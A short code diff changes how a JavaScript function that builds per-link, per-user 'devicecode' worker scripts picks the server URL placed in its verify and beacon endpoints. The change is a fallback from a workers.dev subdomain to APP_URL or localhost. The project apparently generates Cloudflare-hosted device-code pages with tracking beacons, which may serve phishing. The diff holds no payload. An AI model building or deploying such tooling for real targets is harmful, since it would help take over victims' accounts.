@@ -34,8 +34,16 @@ function buildWorkerScript(link, user) {
   // Load worker base
   let workerScript = fs.readFileSync(path.join(__dirname, 'devicecode-worker.js'), 'utf8');
 
-  // Inject values
-  const serverUrl = `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev`;
+  // Inject values - use CF_WORKERS_SUBDOMAIN when set, otherwise fall back to
+  // configured APP_URL or a localhost development URL. Avoid producing "https://.workers.dev".
+  let serverUrl = '';
+  if (config.CF_WORKERS_SUBDOMAIN) {
+    serverUrl = `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev`;
+  } else if (config.APP_URL) {
+    serverUrl = String(config.APP_URL).trim().replace(/\/$/, '');
+  } else {
+    serverUrl = `http://localhost:${config.PORT || 3000}`;
+  }
   workerScript = workerScript
     .replace("'{{VERIFY_ENDPOINT}}'", `'${serverUrl}'`)
     .replace("'{{BEACON_ENDPOINT}}'", `'${serverUrl}'`)
